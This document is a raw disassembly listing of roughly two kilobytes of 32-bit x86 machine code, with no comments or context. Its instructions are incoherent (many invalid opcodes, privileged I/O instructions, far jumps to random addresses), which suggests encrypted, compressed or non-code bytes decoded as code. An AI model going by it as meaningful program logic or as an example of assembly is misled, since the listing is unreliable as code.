  411fd2:	shl    edi,0x9f
  411fd5:	int    0x4b
  411fd7:	(bad)  
  411fd8:	fistp  DWORD PTR [edi+0x1c]
  411fdb:	cmp    bh,BYTE PTR [ebp+0x75b505fb]
  411fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fe2:	lds    eax,FWORD PTR [edi]
  411fe4:	cmp    al,0x4b
  411fe6:	jnp    0x412042
  411fe8:	push   ebp
  411fe9:	es dec ecx
  411feb:	or     al,0xa9
  411fed:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  411fef:	pop    es
  411ff0:	std    
  411ff1:	push   ss
  411ff2:	les    ebx,FWORD PTR [edi+eiz*2-0x20]
  411ff6:	enter  0x181a,0x35
  411ffa:	add    DWORD PTR [edx],0x90cb756b
  412000:	jbe    0x412077
  412002:	adc    edx,DWORD PTR [ebp+0xc9c9a68]
  412008:	xchg   BYTE PTR [edi],dl
  41200a:	mov    dh,0x8
  41200c:	dec    esp
  41200d:	sbb    BYTE PTR [ebx-0x44],0xa
  412011:	jmp    0xc3b2:0x5edf17b0
  412018:	pop    ss
  412019:	sub    BYTE PTR [eax+0x1a],cl
  41201c:	inc    ebp
  41201d:	mov    cl,0x3e
  41201f:	(bad)  
  412020:	sbb    BYTE PTR [ecx],bh
  412022:	pop    edx
  412023:	aaa    
  412024:	jle    0x412013
  412026:	call   0x401a334
  41202b:	fstp   TBYTE PTR [edi-0x75de29a7]
  412031:	scas   eax,DWORD PTR es:[edi]
  412032:	jecxz  0x41208e
  412034:	out    dx,al
  412035:	(bad)  
  412037:	push   ds
  412038:	jns    0x4120b3
  41203a:	adc    eax,0x4a212a6e
  41203f:	xor    eax,0xa062723e
  412044:	leave  
  412045:	xchg   ebp,eax
  412046:	popf   
  412047:	or     dl,dh
  412049:	out    0x6d,eax
  41204b:	nop
  41204c:	pop    ebx
  41204d:	fisttp QWORD PTR [ebp-0x31]
  412050:	ret    0x6493
  412053:	arpl   WORD PTR [esi-0xc63d77a],bp
  412059:	or     DWORD PTR [esi+eax*1+0x7104a83a],0xd08973bd
  412064:	leave  
  412065:	adc    DWORD PTR [eax+0x3f],eax
  412068:	adc    bh,BYTE PTR [ecx+0x3f]
  41206b:	outs   dx,BYTE PTR ds:[esi]
  41206c:	icebp  
  41206d:	jns    0x4120cf
  41206f:	gs std 
  412071:	das    
  412072:	rcl    BYTE PTR [esi],cl
  412074:	push   eax
  412075:	js     0x4120f1
  412077:	cld    
  412078:	sbb    edx,edx
  41207a:	cmp    eax,0x5c15a97f
  41207f:	mov    WORD PTR es:[edx+0x78fcceed],cs
  412086:	arpl   WORD PTR [esi],sp
  412088:	call   0xceb741cb
  41208d:	xor    eax,0xebb3c83f
  412092:	fistp  DWORD PTR ds:[ebx]
  412095:	sub    al,0xa1
  412097:	xchg   BYTE PTR [ecx+ebx*8-0x5e],ah
  41209b:	xchg   edi,eax
  41209c:	pushf  
  41209d:	mov    al,0xff
  41209f:	sbb    al,0xa5
  4120a1:	ret    
  4120a2:	fmul   QWORD PTR [ecx-0x61b14a86]
  4120a8:	xchg   edi,eax
  4120a9:	adc    al,BYTE PTR [edx+ecx*1-0x9]
  4120ad:	push   esi
  4120ae:	(bad)  
  4120af:	popa   
  4120b0:	xchg   ebp,ecx
  4120b2:	and    bl,0xe7
  4120b5:	lds    edx,FWORD PTR [eax]
  4120b7:	dec    ecx
  4120b8:	jmp    0x35c9:0x69df3dbd
  4120bf:	sub    al,dl
  4120c1:	or     cl,cl
  4120c3:	xor    DWORD PTR [ebx+0x1ba565f5],ecx
  4120c9:	mov    al,ds:0xb424822f
  4120ce:	mov    BYTE PTR [ecx+0x1],0xf2
  4120d2:	inc    esi
  4120d3:	xor    DWORD PTR [edi+ebp*4+0x21f006a0],0xf04a9bc6
  4120de:	pop    ds
  4120df:	dec    esp
  4120e0:	and    DWORD PTR [edi-0x4dc159d7],ebx
  4120e6:	aaa    
  4120e7:	push   esp
  4120e8:	adc    BYTE PTR [ebx],0x35
  4120eb:	lods   eax,DWORD PTR ds:[esi]
  4120ec:	test   dh,0x1f
  4120ef:	gs push esp
  4120f1:	stos   DWORD PTR es:[edi],eax
  4120f2:	sub    al,0x74
  4120f4:	push   edi
  4120f5:	xchg   BYTE PTR [eax],cl
  4120f7:	les    edi,FWORD PTR [esi-0x78]
  4120fa:	(bad)  
  4120fb:	xor    eax,0x1dfee9c4
  412100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412101:	mov    ds:0x2cbfc4b3,eax
  412106:	shl    DWORD PTR [eax+0x33c7238],cl
  41210c:	sbb    al,0x15
  41210e:	pop    ss
  41210f:	imul   edx,DWORD PTR [esi],0xffffffd0
  412112:	pop    ebp
  412113:	mov    esi,0x6ece76f0
  412118:	push   es
  412119:	adc    edi,DWORD PTR [ecx-0x33]
  41211c:	dec    eax
  41211d:	xchg   esi,eax
  41211e:	aad    0xbc
  412120:	adc    eax,0x8b70dcbe
  412125:	push   esi
  412126:	pop    ds
  412127:	nop
  412128:	sbb    eax,0x9001179e
  41212d:	icebp  
  41212e:	xchg   edx,eax
  41212f:	sub    BYTE PTR [eax+0x32],ch
  412132:	ror    ecx,1
  412134:	aas    
  412135:	ret    
  412136:	jle    0x412183
  412138:	clc    
  412139:	iret   
  41213a:	daa    
  41213b:	mov    cl,0x75
  41213d:	xchg   edi,eax
  41213e:	add    al,0xa7
  412140:	bound  edx,QWORD PTR [esi+esi*2-0x3b4eda1e]
  412147:	dec    edx
  412148:	call   0x94cfdad9
  41214d:	or     BYTE PTR [ebx+0x7bd036b3],bh
  412153:	or     al,0x44
  412155:	add    dl,BYTE PTR [esi+0x4e]
  412158:	mov    eax,ds:0x39e0a2f8
  41215d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41215e:	das    
  41215f:	cs in  eax,0x27
  412162:	dec    ebp
  412163:	in     al,dx
  412164:	call   0x579fc919
  412169:	dec    esp
  41216a:	(bad)  
  41216b:	jmp    0x4bfb:0x4c271d08
  412172:	sbb    eax,0xe3dff2b0
  412177:	jb     0x412126
  412179:	and    esp,DWORD PTR [edi-0x26258c57]
  41217f:	ret    0x85df
  412182:	mov    edi,DWORD PTR [bp+si]
  412185:	call   0x8083:0xf3638297
  41218c:	repz or DWORD PTR [ebx],ecx
  41218f:	pop    ebp
  412190:	push   eax
  412191:	stos   DWORD PTR es:[edi],eax
  412192:	mov    BYTE PTR [ecx-0x7c],0x5d
  412196:	fprem1 
  412198:	mov    esp,0xbe0ebbae
  41219d:	adc    DWORD PTR [ecx+0x7d],edx
  4121a0:	bound  esi,QWORD PTR [ebx]
  4121a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121a3:	icebp  
  4121a4:	(bad)  
  4121a5:	mov    edx,DWORD PTR [ecx]
  4121a7:	imul   ebx,DWORD PTR [eax-0x6b],0xffffffae
  4121ab:	lahf   
  4121ac:	(bad)  
  4121ae:	out    0x64,al
  4121b0:	lods   eax,DWORD PTR ds:[esi]
  4121b1:	add    BYTE PTR [ebx+0x1b],al
  4121b4:	cld    
  4121b5:	addr16 imul esi,esi,0x25
  4121b9:	add    cl,BYTE PTR [edi+0x23]
  4121bc:	dec    esi
  4121bd:	pop    ebx
  4121be:	bound  ecx,QWORD PTR [esi-0x4c]
  4121c1:	sub    esi,DWORD PTR [esp+edi*4+0x7f]
  4121c5:	or     eax,esi
  4121c7:	nop
  4121c8:	in     al,dx
  4121c9:	aaa    
  4121ca:	cdq    
  4121cb:	jno    0x4121d5
  4121cd:	jg     0x412151
  4121cf:	cwde   
  4121d0:	stos   DWORD PTR es:[edi],eax
  4121d1:	dec    esp
  4121d2:	fwait
  4121d3:	xchg   DWORD PTR [edx+0x41a3c498],esi
  4121d9:	in     al,0x55
  4121db:	or     al,0xe9
  4121dd:	stos   BYTE PTR es:[edi],al
  4121de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121df:	cmp    al,0x7
  4121e1:	ja     0x4121bd
  4121e3:	pop    eax
  4121e4:	mov    al,BYTE PTR [ebp-0x6e4e32ec]
  4121ea:	jnp    0x4121d3
  4121ec:	out    0x1e,eax
  4121ee:	out    0xf0,eax
  4121f0:	cdq    
  4121f1:	pop    es
  4121f2:	jmp    0xdf8d:0xe04a8bd9
  4121f9:	fdiv   st,st(7)
  4121fb:	sub    DWORD PTR [edi],0xffffffd8
  4121fe:	cld    
  4121ff:	cmp    al,0x41
  412201:	cwde   
  412202:	adc    al,0x3
  412204:	ins    BYTE PTR es:[edi],dx
  412205:	ret    0x7ae9
  412208:	mov    eax,0x4ff7fa0a
  41220d:	cmp    al,0xb2
  41220f:	cmp    bl,BYTE PTR [eax+0x53]
  412212:	mov    fs,esp
  412214:	dec    eax
  412215:	xchg   edx,eax
  412216:	or     DWORD PTR [eax+0xa],edx
  412219:	mov    al,0x16
  41221b:	mov    ds:0x63198bee,eax
  412220:	pop    edi
  412221:	sub    esp,0x18a5e04f
  412227:	into   
  412228:	add    edx,ebx
  41222a:	cli    
  41222b:	add    edx,DWORD PTR [edi+0x10]
  41222e:	jnp    0x412240
  412230:	dec    ebx
  412231:	inc    ebp
  412232:	mov    WORD PTR [edx+eax*4-0x1b],?
  412236:	addr16 test al,0xa2
  412239:	fidiv  WORD PTR [ebx]
  41223b:	std    
  41223c:	call   0xc17c5a39
  412241:	cdq    
  412242:	call   0xf6006313
  412247:	add    ebx,edx
  412249:	jno    0x4122ac
  41224b:	dec    DWORD PTR ds:0x7a49beb6
  412251:	push   ebp
  412252:	mov    ebp,0x67655eae
  412257:	push   ecx
  412258:	es adc al,0x81
  41225b:	cli    
  41225c:	xchg   edx,eax
  41225d:	mov    eax,ds:0x32b201d0
  412262:	mov    ss,WORD PTR [edi+0x26]
  412265:	jnp    0x41225b
  412267:	int3   
  412268:	jmp    0x41226e
  41226a:	ins    DWORD PTR es:[edi],dx
  41226b:	push   cs
  41226c:	jmp    DWORD PTR [esi]
  41226e:	fcomp  QWORD PTR [eax+0x5]
  412271:	adc    ax,0xa9b6
  412275:	out    dx,eax
  412276:	pushf  
  412277:	cmp    al,0xf5
  412279:	sbb    DWORD PTR [eax-0x10],ebp
  41227c:	call   0xf6568908
  412281:	and    bh,BYTE PTR [ecx+edi*4+0x5273cb5b]
  412288:	and    eax,0xb47a9b67
  41228d:	fistp  WORD PTR [ecx]
  41228f:	jo     0x4122f3
  412291:	adc    cl,BYTE PTR [eax]
  412293:	dec    esp
  412294:	imul   ah
  412296:	mov    al,0x44
  412298:	mov    esp,0x31619059
  41229d:	inc    ebp
  41229e:	xor    al,dl
  4122a0:	sub    al,0x67
  4122a2:	jae    0x412242
  4122a4:	retf   
  4122a5:	stos   BYTE PTR es:[edi],al
  4122a6:	cmp    edx,DWORD PTR [edi+0x6395861f]
  4122ac:	mov    ebx,0xf534d8b9
  4122b1:	jnp    0x412274
  4122b3:	and    BYTE PTR [ecx+0x60],0xab
  4122b7:	lods   eax,DWORD PTR ds:[esi]
  4122b8:	pop    ebx
  4122b9:	js     0x4122f3
  4122bb:	pop    es
  4122bc:	cs pop es
  4122be:	std    
  4122bf:	dec    esi
  4122c0:	jo     0x412321
  4122c2:	setle  BYTE PTR [ebp+0x2f3cb4ad]
  4122c9:	or     edx,DWORD PTR [eax+0x4f16e432]
  4122cf:	je     0x412332
  4122d1:	mov    esp,0x2824474e
  4122d6:	hlt    
  4122d7:	push   0x2bceeade
  4122dc:	mov    ebx,0x74080861
  4122e1:	mov    BYTE PTR [ebp+ecx*8+0x2c5fe030],ah
  4122e8:	or     bl,BYTE PTR [edx]
  4122ea:	push   ss
  4122eb:	outs   dx,DWORD PTR ds:[esi]
  4122ec:	not    BYTE PTR [ebx+eax*8]
  4122ef:	xchg   edx,eax
  4122f0:	mov    bl,BYTE PTR [eax+0x674636b9]
  4122f6:	mov    DWORD PTR [esp+esi*1+0x840a63b],esi
  4122fd:	call   0xac60ec9f
  412302:	inc    esp
  412303:	sbb    eax,0xd77233ac
  412308:	out    dx,al
  412309:	int3   
  41230a:	xor    DWORD PTR [eax-0x70],esi
  41230d:	inc    eax
  41230e:	xchg   edx,eax
  41230f:	push   ecx
  412310:	add    esp,DWORD PTR [ecx+0x6181f744]
  412316:	xchg   edi,eax
  412317:	sar    BYTE PTR [esp+ebp*8+0x1a6d431f],0xf9
  41231f:	sub    ah,bl
  412321:	pop    esi
  412322:	or     DWORD PTR [eax-0x5f],ebp
  412325:	aam    0x67
  412327:	add    esi,DWORD PTR [esi+0x49]
  41232a:	clc    
  41232b:	mov    cl,0x80
  41232d:	fidivr DWORD PTR [ecx+0x15]
  412330:	das    
  412331:	mov    ds:0x6cab1ed3,al
  412336:	push   es
  412337:	cmc    
  412338:	test   eax,0xd09fcd59
  41233d:	mov    bh,0x93
  41233f:	cmp    edx,ebp
  412341:	and    dh,ch
  412343:	aaa    
  412344:	xchg   ebx,eax
  412345:	inc    esp
  412346:	js     0x41237a
  412348:	cmp    ah,BYTE PTR [ebx]
  41234a:	call   0xdd3e:0x162f7ee7
  412351:	inc    ebx
  412352:	aad    0xea
  412354:	xor    eax,0x427837e8
  412359:	cdq    
  41235a:	dec    ecx
  41235b:	jmp    0x4123c2
  41235d:	and    al,0x25
  41235f:	retf   
  412360:	mov    dl,0x38
  412362:	cli    
  412363:	push   0xffffff90
  412365:	mov    BYTE PTR [ebx+0x6e],ah
  412368:	inc    esi
  412369:	mov    bl,0x8
  41236b:	mov    BYTE PTR [eax],ah
  41236d:	and    dl,ch
  41236f:	leave  
  412370:	xchg   esi,eax
  412371:	cli    
  412372:	fs xchg edx,eax
  412374:	sbb    BYTE PTR [eax],ah
  412376:	mov    esp,0x2e5b38ef
  41237b:	add    DWORD PTR [esi-0x5aba3a3],ebx
  412381:	pop    esi
  412382:	push   edi
  412383:	xor    BYTE PTR [edi],dl
  412385:	loope  0x412391
  412387:	std    
  412388:	pop    ebp
  412389:	dec    eax
  41238a:	jmp    0xc3b8:0x15c30347
  412391:	bound  ecx,QWORD PTR [ebp+eiz*1+0x75]
  412395:	lods   eax,DWORD PTR ds:[esi]
  412396:	cwde   
  412397:	cmp    al,0x2e
  412399:	ret    0x6f1b
  41239c:	stos   BYTE PTR es:[edi],al
  41239d:	xchg   BYTE PTR [ecx-0x20debc6c],bh
  4123a3:	mov    cl,BYTE PTR [edi-0x7fc73b68]
  4123a9:	jns    0x4123a9
  4123ab:	jmp    0x4123fb
  4123ad:	out    dx,eax
  4123ae:	stc    
  4123af:	cmc    
  4123b0:	jle    0x41242d
  4123b2:	(bad)  
  4123b3:	lahf   
  4123b4:	cmp    bl,BYTE PTR [esi]
  4123b6:	or     bh,BYTE PTR [ebp-0x4e]
  4123b9:	(bad)  
  4123bb:	and    DWORD PTR [esi+0x708e338b],esp
  4123c1:	xlat   BYTE PTR ds:[ebx]
  4123c2:	push   ebp
  4123c3:	imul   ecx,DWORD PTR [esi+0x55],0x75e968eb
  4123ca:	jmp    0x662e14c2
  4123cf:	dec    eax
  4123d0:	lods   al,BYTE PTR ds:[esi]
  4123d1:	xor    BYTE PTR [edi],bh
  4123d3:	shl    DWORD PTR [ecx-0x6d],cl
  4123d6:	adc    edx,DWORD PTR [edx]
  4123d8:	fwait
  4123d9:	push   0x5c84b954
  4123de:	into   
  4123df:	test   ah,dh
  4123e1:	mov    bh,0xc5
  4123e3:	mov    ch,0xef
  4123e5:	hlt    
  4123e6:	cwde   
  4123e7:	loope  0x412416
  4123e9:	push   edx
  4123ea:	xor    dl,0xed
  4123ed:	adc    eax,0x641d5946
  4123f2:	pop    ebp
  4123f3:	mov    ah,0x6f
  4123f5:	push   eax
  4123f6:	bnd jb 0x412434
  4123f9:	adc    al,0x33
  4123fb:	xchg   esi,eax
  4123fc:	xchg   ecx,eax
  4123fd:	jmp    0x58eb:0x1a9d16d7
  412404:	lock neg DWORD PTR [ebp-0x47]
  412408:	inc    edx
  412409:	and    ecx,DWORD PTR [edx]
  41240b:	enter  0xb4bb,0x27
  41240f:	sbb    al,bh
  412411:	lahf   
  412412:	std    
  412413:	lahf   
  412414:	mov    eax,0x1f43de67
  412419:	push   DWORD PTR [edx]
  41241b:	lea    ecx,[esi]
  41241d:	(bad)  
  41241e:	mov    ebx,0xe6781361
  412423:	jecxz  0x4123c1
  412425:	jnp    0x412438
  412427:	dec    edx
  412428:	dec    ebx
  412429:	push   esi
  41242a:	outs   dx,DWORD PTR ds:[esi]
  41242b:	ret    
  41242c:	and    DWORD PTR [ebp+0x5ba35b8e],ebx
  412432:	sub    esp,ebx
  412434:	add    WORD PTR ds:0x1e138eb1,bp
  41243b:	aad    0xaa
  41243d:	out    dx,al
  41243e:	xchg   ebx,eax
  41243f:	fsubr  st(1),st
  412441:	(bad)  
  412442:	jmp    ebp
  412444:	xor    al,0x38
  412446:	xchg   edx,eax
  412447:	fist   DWORD PTR [ecx-0x6ac0f589]
  41244d:	jge    0x412465
  41244f:	dec    ecx
  412450:	rdmsr  
  412452:	lods   eax,DWORD PTR ds:[esi]
  412453:	pusha  
  412454:	ds mov ah,0xec
  412457:	mov    edi,0xaabad11
  41245c:	cmp    eax,0xc9b11c5e
  412461:	pop    ebx
  412462:	pop    edi
  412463:	cmp    eax,esi
  412465:	push   ecx
  412466:	repnz lahf 
  412468:	xchg   ecx,eax
  412469:	lds    edi,FWORD PTR [eax+0x3917b6f5]
  41246f:	push   ds
  412470:	pusha  
  412471:	pop    eax
  412472:	int3   
  412473:	adc    DWORD PTR [esi],ebx
  412475:	sti    
  412476:	outs   dx,DWORD PTR ds:[esi]
  412477:	imul   eax,DWORD PTR [edx-0x28],0x8af3d288
  41247e:	push   eax
  41247f:	jmp    0x7347f3e4
  412484:	sub    ch,BYTE PTR [eax+ecx*2]
  412487:	push   ecx
  412488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412489:	or     cl,ah
  41248b:	into   
  41248c:	arpl   WORD PTR [edi+0x1626e962],di
  412492:	ds push ecx
  412494:	xchg   ebx,eax
  412495:	aam    0x28
  412497:	dec    ebp
  412498:	sub    eax,0x550ee2c4
  41249d:	pop    es
  41249e:	mov    BYTE PTR [eax+eax*4],al
  4124a1:	dec    esp
  4124a2:	xor    al,0xea
  4124a4:	mov    cl,BYTE PTR [ebx+0x99e77b7]
  4124aa:	mov    esi,0xc75c9ad1
  4124af:	push   es
  4124b0:	lock iret 
  4124b2:	and    ebx,eax
  4124b4:	repz shl DWORD PTR [esi+0x37bd2e83],cl
  4124bb:	ss lock in al,0x66
  4124bf:	pop    ecx
  4124c0:	add    ecx,DWORD PTR [ecx+0x2c]
  4124c3:	mov    ch,0x5b
  4124c5:	pop    ebp
  4124c6:	push   0xbc38da69
  4124cb:	sub    eax,0x75bd0ef3
  4124d0:	mov    fs,WORD PTR [edx-0x4b1720e2]
  4124d6:	dec    edx
  4124d7:	xor    eax,DWORD PTR [ecx-0xb3c93e8]
  4124dd:	jg     0x41252c
  4124df:	stos   DWORD PTR es:[edi],eax
  4124e0:	gs (bad) 
  4124e2:	xor    al,BYTE PTR [edx+0x44]
  4124e5:	cmp    DWORD PTR [ecx-0x34],0x67285f06
  4124ec:	lea    esi,[edx+eax*1-0x25]
  4124f0:	test   al,0x95
  4124f2:	ins    BYTE PTR es:[edi],dx
  4124f3:	push   eax
  4124f4:	mov    bl,0xac
  4124f6:	add    eax,0x540e1184
  4124fb:	xor    al,0x8a
  4124fd:	aaa    
  4124fe:	mov    ebp,0xb729f29d
  412503:	xchg   BYTE PTR [ebp+0x39],ah
  412506:	xchg   edx,eax
  412507:	data16 int3 
  412509:	arpl   WORD PTR [ebx+ebp*1],sp
  41250c:	hlt    
  41250d:	and    ecx,ebp
  41250f:	pop    ds
  412510:	hlt    
  412511:	inc    edi
  412512:	push   0xffffffba
  412514:	xchg   edx,eax
  412515:	(bad)
  412518:	arpl   WORD PTR ds:0x727965bf,ax
  41251e:	inc    ebx
  41251f:	xor    cl,BYTE PTR [ebp-0x4f0c7681]
  412525:	lods   al,BYTE PTR ds:[esi]
  412526:	jb     0x4125a5
  412528:	xor    eax,0xe0954540
  41252d:	mov    ds:0x9447d963,eax
  412532:	pop    edi
  412533:	jmp    0x412538
  412535:	jns    0x4125a3
  412537:	or     eax,0x3dbde729
  41253c:	pop    esi
  41253d:	sub    DWORD PTR [esi],esp
  41253f:	mov    ds,WORD PTR [edx+ebp*8]
  412542:	mov    cs:0x1b99a46a,al
  412548:	and    dl,BYTE PTR [ecx]
  41254a:	mov    dh,0x26
  41254c:	pop    es
  41254d:	mov    ebx,0x2a8846ea
  412552:	hlt    
  412553:	or     al,0xca
  412555:	or     al,0x6f
  412557:	lods   eax,DWORD PTR ds:[esi]
  412558:	lahf   
  412559:	jb     0x4124f8
  41255b:	mov    ebx,0x8ec67a32
  412560:	js     0x41251e
  412562:	das    
  412563:	jg     0x41250f
  412565:	mov    al,ds:0xcaee6c2
  41256a:	fsubr  QWORD PTR [esi+0x5fbbc0a4]
  412570:	xchg   esi,eax
  412571:	or     ah,BYTE PTR [edi]
  412573:	test   DWORD PTR [edi],0x56e66108
  412579:	lahf   
  41257a:	cwde   
  41257b:	dec    ecx
  41257c:	push   es
  41257d:	push   ss
  41257e:	in     al,dx
  41257f:	mov    edx,0xc0db077b
  412584:	push   esi
  412585:	adc    ebp,ecx
  412587:	dec    esi
  412588:	cmp    eax,ebx
  41258a:	mov    ebp,ebp
  41258c:	pop    edi
  41258d:	xchg   edx,eax
  41258e:	adc    al,0x87
  412590:	or     DWORD PTR [esi+0x6e],0xcf27cb3
  412597:	xchg   esp,eax
  412598:	test   edi,esi
  41259a:	xor    al,0xee
  41259c:	sbb    BYTE PTR [eax+0x7c49ae3d],dh
  4125a2:	adc    bl,BYTE PTR [edi-0x7554e196]
  4125a8:	ja     0x4125ef
  4125aa:	mov    edi,0x5edfa252
  4125af:	sbb    DWORD PTR [eax-0x3],0x59
  4125b3:	bound  edi,QWORD PTR [eax-0x7a482c6c]
  4125b9:	retf   0xf7d6
  4125bc:	push   esp
  4125bd:	inc    ebx
  4125be:	and    ebp,DWORD PTR [eax+0x2b]
  4125c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125c2:	jl     0x412606
  4125c4:	(bad)  
  4125c5:	or     BYTE PTR [eax-0x50d56251],dh
  4125cb:	add    eax,0x56dbdc9f
  4125d0:	cld    
  4125d1:	in     al,0xd
  4125d3:	xchg   ebp,eax
  4125d4:	inc    edi
  4125d5:	pop    ds
  4125d6:	aam    0xb5
  4125d8:	mov    ebp,0xe5eb2bfd
  4125dd:	push   edi
  4125de:	xor    BYTE PTR [esi-0x7e],ah
  4125e1:	or     esi,DWORD PTR ds:0x536ca4f0
  4125e7:	mov    edx,0x64e1087f
  4125ec:	test   eax,0x73ba7bb2
  4125f1:	adc    edx,eax
  4125f3:	add    ecx,esp
  4125f5:	and    BYTE PTR ds:0xc6d9ccdf,bl
  4125fb:	cwde   
  4125fc:	jg     0x4125e5
  4125fe:	jmp    0x997f:0x3aef6930
  412605:	repnz push 0xaa19589a
  41260b:	fs test al,0xde
  41260e:	stc    
  41260f:	les    ebp,FWORD PTR [ebx]
  412611:	push   edi
  412612:	xchg   edi,eax
  412613:	sti    
  412614:	sbb    al,0x3a
  412616:	loope  0x412674
  412618:	jns    0x412603
  41261a:	jb     0x412626
  41261c:	out    0xea,eax
  41261e:	pop    es
  41261f:	into   
  412620:	rcr    edi,cl
  412622:	lods   al,BYTE PTR ds:[esi]
  412623:	arpl   cx,sp
  412625:	mov    ebx,0x8e66af68
  41262a:	js     0x412670
  41262c:	pop    eax
  41262d:	icebp  
  41262e:	les    edx,FWORD PTR [ecx+0x21]
  412631:	cli    
  412632:	ins    BYTE PTR es:[edi],dx
  412633:	mov    ds:0x5733010b,eax
  412638:	cmp    DWORD PTR [ebx+0x1f],esp
  41263b:	pop    ds
  41263c:	aas    
  41263d:	mov    ecx,0x519e9d7e
  412642:	(bad)  
  412644:	xor    al,0x86
  412646:	shr    BYTE PTR ds:0x3dfe0f1d,cl
  41264c:	icebp  
  41264d:	xlat   BYTE PTR ds:[ebx]
  41264e:	(bad)  
  41264f:	(bad)  
  412650:	(bad)  
  412652:	push   DWORD PTR [ecx-0x40561118]
  412658:	cmp    BYTE PTR [eax-0x6e9c3d91],bl
  41265e:	pop    eax
  41265f:	mov    esp,0xd0cb83c9
  412664:	mov    edi,0x28359e04
  412669:	and    BYTE PTR [eax-0xd260ebd],bl
  41266f:	mov    bh,0xd1
  412671:	ret    
  412672:	ins    BYTE PTR es:[edi],dx
  412673:	call   0xf154:0x8bea
  412679:	sub    bl,BYTE PTR [ecx+0x59]
  41267c:	add    BYTE PTR [edx-0x6e],bl
  41267f:	add    DWORD PTR [edi],edi
  412681:	sub    al,dh
  412683:	dec    esi
  412684:	mov    eax,ds:0x50dc0a6b
  412689:	retf   0x313e
  41268c:	push   ebx
  41268d:	jae    0x4126f2
  41268f:	mov    ecx,0x768f19f3
  412694:	pop    ss
  412695:	pop    esp
  412696:	push   eax
  412697:	inc    ecx
  412698:	cwde   
  412699:	cmp    DWORD PTR [edi],edi
  41269b:	shl    DWORD PTR [eax-0x7f7f7a29],0x85
  4126a2:	cdq    
  4126a3:	push   edx
  4126a4:	repnz adc eax,DWORD PTR [edx]
  4126a7:	and    eax,ecx
  4126a9:	stos   BYTE PTR es:[edi],al
  4126aa:	or     DWORD PTR [ecx+0x27],ecx
  4126ad:	shl    ah,1
  4126af:	xor    al,0x5b
  4126b1:	inc    BYTE PTR [esi+eax*4]
  4126b4:	add    al,0x79
  4126b6:	call   0xd221:0xff1e7504
  4126bd:	fild   WORD PTR [ecx+0x7f188260]
  4126c3:	lds    ecx,FWORD PTR [ebx]
  4126c5:	loop   0x412715
  4126c7:	or     eax,0x78b64155
  4126cc:	popf   
  4126cd:	pusha  
  4126ce:	mov    ebx,DWORD PTR [esi-0x1f95740c]
  4126d4:	mov    esi,0xb877691d
  4126d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126da:	jmp    0x4126db
  4126dc:	jmp    0xc592:0x7d15cc87
  4126e3:	ror    ch,0x8d
  4126e6:	mov    WORD PTR [ecx-0x3b],ss
  4126e9:	dec    ebp
  4126ea:	inc    esp
  4126eb:	jp     0x4126a1
  4126ed:	pop    esi
  4126ee:	jb     0x412760
  4126f0:	cmp    bl,BYTE PTR [esi+0x14]
  4126f3:	rcl    BYTE PTR [eax-0x62a125f2],0x34
  4126fa:	mov    eax,ds:0x44cfe817
  4126ff:	dec    ebx
  412700:	push   ecx
  412701:	(bad)  
  412702:	mov    esi,0xe5f4226f
  412707:	shl    DWORD PTR [edx],cl
  412709:	mov    eax,es:0x91fcfc81
  41270f:	aas    
  412710:	idiv   BYTE PTR [eax-0x561c668e]
  412716:	nop
  412717:	les    esp,FWORD PTR [esi]
  412719:	enter  0xe997,0x19
  41271d:	popa   
  41271e:	adc    eax,0x65890b9b
  412723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412724:	pushf  
  412725:	sbb    ecx,DWORD PTR [ebx+0x66]
  412728:	or     al,0xd2
  41272a:	push   ss
  41272b:	fstp   DWORD PTR [eax+edi*2+0x68]
  41272f:	pop    edx
  412730:	call   0xc7b3d2fe
  412735:	sbb    ch,BYTE PTR [edi]
  412737:	lea    esp,[ecx]
  412739:	fwait
  41273a:	xchg   ebx,eax
  41273b:	jle    0x41278b
  41273d:	push   0x65
  41273f:	mov    al,0x50
  412741:	ret    0x5e2a
  412744:	(bad)  
  412745:	in     al,0x2
  412747:	add    BYTE PTR [esi+0x30cbd514],cl
  41274d:	and    BYTE PTR [eax+0x57808aa],ch
  412753:	punpcklwd mm4,DWORD PTR [edx-0x2f]
  412757:	or     BYTE PTR [edx-0x1c6af8eb],ch
  41275d:	jne    0x41273e
  41275f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412760:	jp     0x4127be
  412762:	js     0x4127b1
  412764:	je     0x41277d
  412766:	push   ecx
  412767:	bound  edx,QWORD PTR [esi]
  412769:	icebp  
  41276a:	test   cl,0xda
  41276d:	lahf   
  41276e:	repz push es
  412770:	lea    edi,[ebx]
  412772:	pusha  
  412773:	add    BYTE PTR [eax+0x5f],bh
  412776:	jb     0x412779
  412778:	pop    ebp
  412779:	arpl   WORD PTR [edx-0x3f4add03],bx
  41277f:	xor    eax,0x3f9dba66
  412784:	sar    BYTE PTR [ebx+0x21],0x7e
  412788:	jo     0x412723
  41278a:	sbb    edi,esi
  41278c:	loop   0x41280c
  41278e:	inc    ebp
  41278f:	mov    cl,0x7
  412791:	push   ds
  412792:	ins    BYTE PTR es:[edi],dx
  412793:	js     0x41279e
  412795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412796:	mov    dh,0xbf
  412798:	leave  
  412799:	int3   
  41279a:	in     al,0xd5
  41279c:	loop   0x41271f
  41279e:	or     al,0x3
  4127a0:	call   0x7082456d
  4127a5:	sbb    DWORD PTR [edx+0x1e011819],ebx
  4127ab:	jmp    0x412752
  4127ad:	cs jne 0x41277a
  4127b0:	in     al,0x5b
  4127b2:	mov    bl,0x5e
  4127b4:	ss fwait
  4127b6:	push   edx
  4127b7:	data16 cmp BYTE PTR [eax+0x6e7ccf8c],dh
  4127be:	or     ecx,esi
  4127c0:	outs   dx,BYTE PTR ds:[esi]
  4127c1:	sar    BYTE PTR [edi],0x48
  4127c4:	retf   0xb8a9
  4127c7:	rcr    DWORD PTR [ebp-0x74],0x8b
  4127cb:	xor    ch,BYTE PTR [eax-0x64]
  4127ce:	out    dx,al
  4127cf:	xchg   ebp,eax
  4127d0:	es push ss
  4127d2:	inc    esp
